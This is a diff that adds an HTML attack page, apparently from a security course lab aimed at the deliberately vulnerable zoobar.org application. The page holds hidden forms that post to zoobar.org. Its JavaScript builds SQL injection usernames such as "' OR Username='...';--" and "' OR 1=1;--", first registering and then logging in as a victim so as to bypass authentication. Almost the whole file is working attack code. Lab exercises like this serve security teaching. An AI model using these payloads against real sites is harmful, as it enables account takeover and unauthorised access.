@@ -1,0 +1,42 @@
+<html>
+<head><title>Injection H4x0r</title></head>
+<body>
+
+<iframe name="ifr" ></iframe>
+<!-- Register form -->
+<form id="register" target="ifr" name=loginform method="POST" action="http://zoobar.org/transfer.php">
+<input id="register_username" type=text name=login_username size=25 autocomplete=no value="">
+<input id="register_password" type=text name=login_password size=25 autocomplete=no value="">
+<input type=hidden name=submit_registration value="Register">
+</form>
+
+<!-- Login form -->  
+<form id="login" id="login" name=loginform method=POST action="http://zoobar.org/transfer.php">
+<input id="login_username" type=text name=login_username size=25 autocomplete=no value="">  
+<input id="login_password" type=hidden name=login_password size=25 autocomplete=no value="">
+<input type=submit onClick="send()" name=submit_login value="Log in">
+</form>
+
+<script type="text/javascript">
+function send(){ 
+    // Register first so we can get our attack script in
+    username = document.getElementById("login_username").value; 
+    attack_username = username + "' OR Username='" + username + "';--"
+//attack_username = username + "' OR 1=1;--";
+    document.getElementById("register_username").value = attack_username;
+    document.getElementById("register_password").value = "hax";
+    document.getElementById('register').submit();
+//    alert('send');
+    login();
+    return false;
+} 
+function login() {   
+    username = document.getElementById("login_username").value
+    attack_username = username + "' OR Username='" + username + "';--"
+//    attack_username = username + "' OR 1=1;--" 
+    document.getElementById("login_username").value = attack_username
+    document.getElementById("login_password").value = "hax"
+    //document.forms[1].submit()
+}
+</script>
+</body>
